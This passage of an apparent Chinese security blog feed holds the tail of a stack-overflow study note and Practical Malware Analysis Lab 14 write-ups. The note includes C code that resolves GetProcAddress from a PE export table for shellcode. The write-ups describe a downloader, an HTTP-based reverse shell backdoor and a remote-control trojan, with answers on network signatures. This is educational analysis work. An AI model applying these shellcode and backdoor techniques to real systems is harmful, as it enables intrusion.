class="hljs-comment">//kernel.dll,偏移10H是地址</span><br>ret<br>&#125;<br>&#125;<br><br>FARPROC _GetProcAddress(HMODULE hModule) &#123;<br>PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;<br>PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);<br>PIMAGE_EXPORT_DIRECTORY lpExport = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pDosHeader +<br>(DWORD)pNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);<br>PDWORD lpAddressOfNamesArray = (PDWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfNames);<br>PWORD lpAddressOfNameOrdinalArray = (PWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfNameOrdinals);<br>PDWORD lpAddressOfFuncArray = (PDWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfFunctions);<br>DWORD dwNumber = lpExport-&gt;NumberOfNames;<br>DWORD wHint = <span class="hljs-number">0</span>;<br>FARPROC lpFunc;<br><span class="hljs-keyword">for</span> (DWORD i = <span class="hljs-number">0</span>; i &lt; dwNumber; i++) &#123;<br><span class="hljs-keyword">char</span>* lpFuncName = (<span class="hljs-keyword">char</span>*)((DWORD)pDosHeader + lpAddressOfNamesArray[i]);<br><span class="hljs-keyword">if</span> (lpFuncName[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;G&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;e&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;t&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;P&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">4</span>] == <span class="hljs-string">&#x27;r&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">5</span>] == <span class="hljs-string">&#x27;o&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">6</span>] == <span class="hljs-string">&#x27;c&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">7</span>] == <span class="hljs-string">&#x27;A&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">8</span>] == <span class="hljs-string">&#x27;d&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">9</span>] == <span class="hljs-string">&#x27;d&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">10</span>] == <span class="hljs-string">&#x27;r&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">11</span>] == <span class="hljs-string">&#x27;e&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">12</span>] == <span class="hljs-string">&#x27;s&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">13</span>] == <span class="hljs-string">&#x27;s&#x27;</span>) &#123;<br>wHint = lpAddressOfNameOrdinalArray[i];<br>lpFunc = (FARPROC)((DWORD)pDosHeader + lpAddressOfFuncArray[wHint]);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> lpFunc;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>实现效果</p><p><img src="/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/1.gif"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本篇主要是学习了栈溢出的原理，及其中的一些利用，难度不是很高。不过我在做的过程中，还是遇到了一些问题，漏洞利用一定要动手去调试，不能光靠看就得出其中的一些结论。还有一定要注意栈的空间，执行shellcode时候是否有足够的空间，不然压栈是会覆盖原始代码的。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本篇笔记主要是《0day安全：软件漏洞分析技术》第一章第二篇的笔记，记录下栈溢出的原理和实践&lt;/p&gt;
&lt;h2 id=&quot;栈溢出原理与实践&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="0day安全：软件漏洞分析技术" scheme="https://b1ackie.cn/categories/0day%E5%AE%89%E5%85%A8%EF%BC%9A%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="读书笔记" scheme="https://b1ackie.cn/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    <category term="漏洞" scheme="https://b1ackie.cn/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>恶意代码分析实战-实验14</title>
    <link href="https://b1ackie.cn/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/"/>
    <id>https://b1ackie.cn/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/</id>
    <published>2021-10-13T08:29:13.000Z</published>
    <updated>2021-12-16T11:00:49.390Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Lab-14-1"><a href="#Lab-14-1" class="headerlink" title="Lab 14-1"></a>Lab 14-1</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>使用IDA打开程序，首先会获取当前计算机的GUID，然后将后12位给拼接成XX:XX:XX:XX:XX:XX的形式。再获取用户名，再将用户名与刚才的字符串拼接。</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/1-1.png"></p><p>拼接后的字符串</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/1-2.png"></p><p>然后会将此字符串进行base64编码，，分析可知<code>sub_4010BB</code>是一个base64编码的函数，且此base64进行了魔改，用于补位的不是“=”而是字符“a”。</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/1-3.png"></p><p>然后会进入<code>sub_4011A3</code>函数，此函数中包含网络行为。会尝试访问一个URL，并且通过<code>URLDownloadToCacheFileA</code>下载资源，此URL的形成是字符串和域名拼接起来，%c.png则是字符串的最后一位，如果最后一位是a，就是a.png，然后保存在<code>ApplicationName</code>，如果下载成功的话，会使用<code>CreateProcessA</code>启动下载的程序。</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/1-4.png"></p><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><h4 id="1-恶意代码使用了哪些网络库？它们的优势是什么？"><a href="#1-恶意代码使用了哪些网络库？它们的优势是什么？" class="headerlink" title="1.恶意代码使用了哪些网络库？它们的优势是什么？"></a>1.恶意代码使用了哪些网络库？它们的优势是什么？</h4><p>恶意代码使用了<code>urlmon.dll</code>中的<code>URLDownloadToCacheFileA</code></p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/1-5.png"></p><h4 id="2-用于构建网络信令的信息源元素是什么，什么样的条件会引起信令的改变？"><a href="#2-用于构建网络信令的信息源元素是什么，什么样的条件会引起信令的改变？" class="headerlink" title="2.用于构建网络信令的信息源元素是什么，什么样的条件会引起信令的改变？"></a>2.用于构建网络信令的信息源元素是什么，什么样的条件会引起信令的改变？</h4><p>根据前面的分析，信息源元素是计算机的<code>GUID</code>和当前的用户名，如果换了计算机或者用户发生改变，会引起信令的改变。</p><h4 id="3-为什么攻击者可能对嵌入在网络信令中的信息感兴趣？"><a href="#3-为什么攻击者可能对嵌入在网络信令中的信息感兴趣？" class="headerlink" title="3.为什么攻击者可能对嵌入在网络信令中的信息感兴趣？"></a>3.为什么攻击者可能对嵌入在网络信令中的信息感兴趣？</h4><p>因为这其中包含着计算器的<code>GUID</code>和当前的用户名。</p><h4 id="4-恶意代码是否使用了标准的base64编码？如果不是，编码是如何不寻常的？"><a href="#4-恶意代码是否使用了标准的base64编码？如果不是，编码是如何不寻常的？" class="headerlink" title="4.恶意代码是否使用了标准的base64编码？如果不是，编码是如何不寻常的？"></a>4.恶意代码是否使用了标准的base64编码？如果不是，编码是如何不寻常的？</h4><p>没有使用标准的base64编码，用于补位的字符不是“=”，而是“a”。</p><h4 id="5-恶意代码的主要目的是什么？"><a href="#5-恶意代码的主要目的是什么？" class="headerlink" title="5.恶意代码的主要目的是什么？"></a>5.恶意代码的主要目的是什么？</h4><p>下载一个文件并且执行它</p><h4 id="6-使用网络特征可能有效探测到恶意代码通信中的什么元素？"><a href="#6-使用网络特征可能有效探测到恶意代码通信中的什么元素？" class="headerlink" title="6.使用网络特征可能有效探测到恶意代码通信中的什么元素？"></a>6.使用网络特征可能有效探测到恶意代码通信中的什么元素？</h4><p>可以使用域名来进行探测</p><h4 id="7-分析者尝试为这个恶意代码开发一个特征时，可能会犯什么错误？"><a href="#7-分析者尝试为这个恶意代码开发一个特征时，可能会犯什么错误？" class="headerlink" title="7.分析者尝试为这个恶意代码开发一个特征时，可能会犯什么错误？"></a>7.分析者尝试为这个恶意代码开发一个特征时，可能会犯什么错误？</h4><p>这个没想到，看了下书上答案</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/1-6.png"></p><h4 id="8-哪些特征集可能检测到这个恶意代码（以及新的变种）？"><a href="#8-哪些特征集可能检测到这个恶意代码（以及新的变种）？" class="headerlink" title="8.哪些特征集可能检测到这个恶意代码（以及新的变种）？"></a>8.哪些特征集可能检测到这个恶意代码（以及新的变种）？</h4><p>可以用域名来作为一个检测的特征，还有BASE64编码也可以作为检测的特征之一。</p><h2 id="Lab-14-2"><a href="#Lab-14-2" class="headerlink" title="Lab 14-2"></a>Lab 14-2</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>使用fakenet工具模拟网络，可以看到程序发出的网络请求。</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/2-1.png"></p><p>首先会读取字符串资源</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/2-2.png"></p><p>可以看到读取的字符串是<code>http://127.0.0.1/tenfour.html</code></p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/2-3.png"></p><p>之后会创建管道，一个是<code>hWritePipe</code>另一个是<code>hReadPipe</code>，推测一个是用来写，一个是用来读。</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/2-4.png"></p><p>创建一个CMD进程</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/2-5.png"></p><p>创建两个线程</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/2-6.png"></p><p>先来看一下第一个线程，它会读取cmd的输出结果，然后<code>sub_401000</code>是一个base64的编码，但是其码表是魔改的，然后会进入<code>sub_401750</code>将结果发送到<code>http://127.0.0.1/tenfour.html</code></p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/2-7.png"></p><p>base64码表</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/2-8.png"></p><p>初始发送的内容</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/2-10.png"></p><p><code>sub_401750</code>将编码后的数据发送出去，<code>strcat</code>会在前面加上几个字符</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/2-9.png"></p><p>在前面添加<code>(!&lt;</code></p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/2-11.png"></p><p>来看一下线程2，<code>sub_401800</code>会接收数据，然后会将接收到的数据写入管道，会在cmd中执行。接收到的数据如果是exit的话会直接退出线程</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/2-12.png"></p><p><code>sub_401800</code></p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/2-13.png"></p><p>最后会执行<code>sub_401880</code>这个函数</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/2-14.png"></p><p>其中会进行自删除</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/2-15.png"></p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/2-16.png"></p><h3 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h3><h4 id="1-恶意代码编写时直接使用IP地址的好处和坏处各是什么？"><a href="#1-恶意代码编写时直接使用IP地址的好处和坏处各是什么？" class="headerlink" title="1.恶意代码编写时直接使用IP地址的好处和坏处各是什么？"></a>1.恶意代码编写时直接使用IP地址的好处和坏处各是什么？</h4><p>还是直接借用书上的答案吧，我也不是很明白说实话。</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/2-17.png"></p><h4 id="2-这个恶意代码使用哪些网络库？使用这些库的好处和坏处是什么？"><a href="#2-这个恶意代码使用哪些网络库？使用这些库的好处和坏处是什么？" class="headerlink" title="2.这个恶意代码使用哪些网络库？使用这些库的好处和坏处是什么？"></a>2.这个恶意代码使用哪些网络库？使用这些库的好处和坏处是什么？</h4><p>使用了<code>wininet.dll</code>，我也不是很清楚优点以及缺点，就拿书上的来回答下吧。这些库的缺点之一是需要提供一个硬编码的<code>User-Agent</code>字段，另外如果需要的话，还需要硬编码可选的头部。相比于<code>Winsock API</code>，<code>WinINet</code>的优点是对于一些元素，比如cookie和缓存，可以由操作系统提供。</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/2-18.png"></p><h4 id="3-恶意代码信令中URL的信息源是什么？这个信息源提供了哪些优势？"><a href="#3-恶意代码信令中URL的信息源是什么？这个信息源提供了哪些优势？" class="headerlink" title="3.恶意代码信令中URL的信息源是什么？这个信息源提供了哪些优势？"></a>3.恶意代码信令中URL的信息源是什么？这个信息源提供了哪些优势？</h4><p>是PE资源节中的IP地址，优势就是可以在不重新编译代码的情况，攻击者通过资源节来部署多个后门程序到多个命令与控制服务器位置。</p><h4 id="4-恶意代码利用了HTTP协议的哪个方面，来完成它的目的？"><a href="#4-恶意代码利用了HTTP协议的哪个方面，来完成它的目的？" class="headerlink" title="4.恶意代码利用了HTTP协议的哪个方面，来完成它的目的？"></a>4.恶意代码利用了HTTP协议的哪个方面，来完成它的目的？</h4><p>使用了<code>User-Agent</code>，包含着要执行的命令以及命令的回显。</p><h4 id="5-在恶意代码的初始信令中传输的是哪种信息？"><a href="#5-在恶意代码的初始信令中传输的是哪种信息？" class="headerlink" title="5.在恶意代码的初始信令中传输的是哪种信息？"></a>5.在恶意代码的初始信令中传输的是哪种信息？</h4><p>根据上面分析可以看到，是一个命令行的信息</p><h4 id="6-这个恶意代码通信信道的设计存在什么缺点？"><a href="#6-这个恶意代码通信信道的设计存在什么缺点？" class="headerlink" title="6.这个恶意代码通信信道的设计存在什么缺点？"></a>6.这个恶意代码通信信道的设计存在什么缺点？</h4><p>只有传给服务器的信息进行了编码，但是接收的指令并没有进行编码。</p><h4 id="7-恶意代码的编码方案是标准的吗？"><a href="#7-恶意代码的编码方案是标准的吗？" class="headerlink" title="7.恶意代码的编码方案是标准的吗？"></a>7.恶意代码的编码方案是标准的吗？</h4><p>不是标准的base64，码表被魔改了</p><h4 id="8-通信是如何被终止的？"><a href="#8-通信是如何被终止的？" class="headerlink" title="8.通信是如何被终止的？"></a>8.通信是如何被终止的？</h4><p>当攻击者发送exit时，就会终止通信</p><h4 id="9-这个恶意代码的目的是什么？在攻击者的工具中，它可能会起到什么作用？"><a href="#9-这个恶意代码的目的是什么？在攻击者的工具中，它可能会起到什么作用？" class="headerlink" title="9.这个恶意代码的目的是什么？在攻击者的工具中，它可能会起到什么作用？"></a>9.这个恶意代码的目的是什么？在攻击者的工具中，它可能会起到什么作用？</h4><p>一个后门工具，攻击者可以通过它来在目标主机上执行shell命令。</p><h2 id="Lab-14-3"><a href="#Lab-14-3" class="headerlink" title="Lab 14-3"></a>Lab 14-3</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>查看主函数，看到是一个<code>do-while</code>循环，主要执行了三个函数，<code>sub_401457</code>、<code>sub_4011F3</code>、<code>sub_401684</code>。现在来分别分析一下这三个函数。</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/3-1.png"></p><p><code>sub_401457</code>主要是在C盘下创建一个文件autobat.exe，并在其中写入信息<code>http://www.practicalmalwareanalysis.com/start.htm</code>，<code>sub_401372</code>是创建文件，如果没有打开的话，说明不存在，会创建，并且向其中写入内容，然后再调用自身。</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/3-2.png"></p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/3-3.png"></p><p><code>sub_4011F3</code>主要是从读取服务器的数据，然后进行处理，主要是将具体的指令提取出来。<code>sub_401000</code>主要是负责将远控指令给提取出来，分析可以知道指令前主要是<code>&lt;noscript&gt;</code>，也就是指令应该是在<code>&lt;noscript&gt;</code>标签内的内容，同时最后必须是<code>96</code>结尾。</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/3-5.png"></p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/3-4.png"></p><p>接收到指令就会到<code>sub_401684</code>，里面是执行具体的远控命令。可以看到有四种命令。</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/3-6.png"></p><p>指令为d的时候，会下载一个文件，并且执行，<code>sub_401147</code>是一个解密的过程，应该是将接收到的数据进行解码。</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/3-7.png"></p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/3-8.png"></p><p>指令为n时，会直接返回1，而根据外面的分析，返回1就会退出执行。</p><p>指令为r时，会向<code>C:\autobat.exe</code>中写入内容。</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/3-9.png"></p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/3-10.png"></p><p>指令为s时，会<code>sleep</code>指定的时间。</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/3-11.png"></p><h3 id="问题-2"><a href="#问题-2" class="headerlink" title="问题"></a>问题</h3><h4 id="1-在初始信令中硬编码元素是什么？什么元素能够用于创建一个好的网络特征？"><a href="#1-在初始信令中硬编码元素是什么？什么元素能够用于创建一个好的网络特征？" class="headerlink" title="1. 在初始信令中硬编码元素是什么？什么元素能够用于创建一个好的网络特征？"></a>1. 在初始信令中硬编码元素是什么？什么元素能够用于创建一个好的网络特征？</h4><p>这些都是硬编码的元素，主要是<code>User-Agent</code>重复了，有两个，可以用于作为检测的网络特征。</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/3-12.png"></p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/3-13.png"></p><h4 id="2-初始信令中的什么元素可能不利于可持久使用的网络特征？"><a href="#2-初始信令中的什么元素可能不利于可持久使用的网络特征？" class="headerlink" title="2. 初始信令中的什么元素可能不利于可持久使用的网络特征？"></a>2. 初始信令中的什么元素可能不利于可持久使用的网络特征？</h4><p>域名，域名可以随时更换</p><h4 id="3-恶意代码是如何获得命令的？本章中的什么例子用了类似的方法？这种技术的优点是什么？"><a href="#3-恶意代码是如何获得命令的？本章中的什么例子用了类似的方法？这种技术的优点是什么？" class="headerlink" title="3. 恶意代码是如何获得命令的？本章中的什么例子用了类似的方法？这种技术的优点是什么？"></a>3. 恶意代码是如何获得命令的？本章中的什么例子用了类似的方法？这种技术的优点是什么？</h4><p>是通过<code>&lt;noscript&gt;</code>标签来获取命令的，这种技术恶意代码可以向一个合法的网页发出信令，并且接收合法内容，这使得防御者区分恶意流量与合法流量变得困难。</p><h4 id="4-当恶意代码接收到输入时，在输入上执行什么检查可以决定它是否是一个有用的命令？攻击者如何隐藏恶意代码正在寻找的命令列表？"><a href="#4-当恶意代码接收到输入时，在输入上执行什么检查可以决定它是否是一个有用的命令？攻击者如何隐藏恶意代码正在寻找的命令列表？" class="headerlink" title="4. 当恶意代码接收到输入时，在输入上执行什么检查可以决定它是否是一个有用的命令？攻击者如何隐藏恶意代码正在寻找的命令列表？"></a>4. 当恶意代码接收到输入时，在输入上执行什么检查可以决定它是否是一个有用的命令？攻击者如何隐藏恶意代码正在寻找的命令列表？</h4><p>分析中已经说明。</p><h4 id="5-什么类型的编码用于命令参数？它与BASE64编码有什么不同？它提供的优点和缺点各是什么？"><a href="#5-什么类型的编码用于命令参数？它与BASE64编码有什么不同？它提供的优点和缺点各是什么？" class="headerlink" title="5. 什么类型的编码用于命令参数？它与BASE64编码有什么不同？它提供的优点和缺点各是什么？"></a>5. 什么类型的编码用于命令参数？它与BASE64编码有什么不同？它提供的优点和缺点各是什么？</h4><p>分析中说的那个编码，它不是base64编码， 优点是自制的编码方式，缺点不知道，还是借用书上的答案吧。</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/3-14.png"></p><h4 id="6-这个恶意代码会接收哪些命令？"><a href="#6-这个恶意代码会接收哪些命令？" class="headerlink" title="6. 这个恶意代码会接收哪些命令？"></a>6. 这个恶意代码会接收哪些命令？</h4><p>分析中分析的，会有四种命令，执行四种操作。</p><h4 id="7-这个恶意代码的目的是什么？"><a href="#7-这个恶意代码的目的是什么？" class="headerlink" title="7. 这个恶意代码的目的是什么？"></a>7. 这个恶意代码的目的是什么？</h4><p>远控木马，会根据命令来执行不同的操作。</p><h4 id="8-本章介绍了用独立的特征，来针对不同位置代码的想法，以增加网络特征的鲁棒性。那么在这个恶意代码中，可以针对哪些区段的代码，或是配置文件，来提取网络特征？"><a href="#8-本章介绍了用独立的特征，来针对不同位置代码的想法，以增加网络特征的鲁棒性。那么在这个恶意代码中，可以针对哪些区段的代码，或是配置文件，来提取网络特征？" class="headerlink" title="8. 本章介绍了用独立的特征，来针对不同位置代码的想法，以增加网络特征的鲁棒性。那么在这个恶意代码中，可以针对哪些区段的代码，或是配置文件，来提取网络特征？"></a>8. 本章介绍了用独立的特征，来针对不同位置代码的想法，以增加网络特征的鲁棒性。那么在这个恶意代码中，可以针对哪些区段的代码，或是配置文件，来提取网络特征？</h4><p>不太懂，借用书上的答案</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/3-15.png"></p><h4 id="9-什么样的网络特征集应该被用于检测恶意代码？"><a href="#9-什么样的网络特征集应该被用于检测恶意代码？" class="headerlink" title="9. 什么样的网络特征集应该被用于检测恶意代码？"></a>9. 什么样的网络特征集应该被用于检测恶意代码？</h4><p>主要就是域名和其中的一些参数吧</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Lab-14-1&quot;&gt;&lt;a href=&quot;#Lab-14-1&quot; class=&quot;headerlink&quot; title=&quot;Lab 14-1&quot;&gt;&lt;/a&gt;Lab 14-1&lt;/h2&gt;&lt;h3 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="恶意代码分析实战" scheme="https://b1ackie.cn/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/"/>
    
    
    <category term="逆向工程" scheme="https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="病毒分析" scheme="https://b1ackie.cn/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    <category term="Lab" scheme="https://b1ackie.cn/tags/Lab/"/>
    
  </entry>
  
  <entry>
    <title>“白加黑”DLL劫持</title>
    <link href="https://b1ackie.cn/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/"/>
    <id>https://b1ackie.cn/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/</id>
    <published>2021-10-11T08:50:39.000Z</published>
    <updated>2021-10-14T02:09:55.026Z</updated>
    
